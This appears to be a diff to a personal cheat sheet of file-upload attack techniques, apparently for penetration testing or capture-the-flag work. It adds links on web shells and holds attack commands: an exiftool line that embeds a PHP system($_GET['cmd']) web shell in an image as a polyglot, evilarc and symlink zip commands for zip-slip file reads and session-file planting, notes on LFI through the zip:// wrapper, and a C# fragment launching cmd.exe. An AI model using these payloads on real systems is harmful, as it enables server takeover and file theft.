@@ -1,3 +1,8 @@
+https://blog.gigamon.com/2022/09/28/investigating-web-shells/
+https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/
+https://www.acunetix.com/blog/articles/web-shells-action-introduction-web-shells-part-4/
+https://github.com/epinna/weevely3
+https://labs.detectify.com/how-to/tutorial-php-webshell-de-obfuscation/
 -------------------------------------C#
 ProcessStartInfo startInfo = new ProcessStartInfo();
 startInfo.FileName = "c#md.exe";          ----------
@@ -25,6 +30,8 @@ change file type
 change file signature
 PYTHON save file by command 
 exiftool -Comment="<?php syst#em($_GET['cm#d']);?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+https://laxiisteam.blogspot.com/2024/03/and-i-tried-my-best.html
+dont use @error_reporting(1), so if we could make some error with file, maybe can be lecked.
 ---------------------------------inject code into image
 https://hackmd.io/@endy/B1zOJfSTh
 https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html
@@ -139,9 +146,12 @@ File upload + LFI vulnerability + PHP Wrapper => Use zip:// wrapper !
 ------------------------------------------------------zip slip
 python evilarc.py -d 2 -o unix hack.txt
 python evilarc.py -o unix -f exploit.zip sess_ -p var/lib/php/sessions
-ln -s originfile  newfile
+#get all src via symlink attack
+https://www.youtube.com/watch?v=WakZS2BhVfs
+#point a file to file to read
+ln -s <file> <path_to_file_need_read>
 zip -r --symlinks demo.zip symlinkfile
-zip -y demo.zip symlinkfile 
+zip -y <file_zip_to_upload> <file_symlink> 
 
 https://github.com/capture0x/LFI-FINDER   #tool find LFI
 -----------------------------------------------
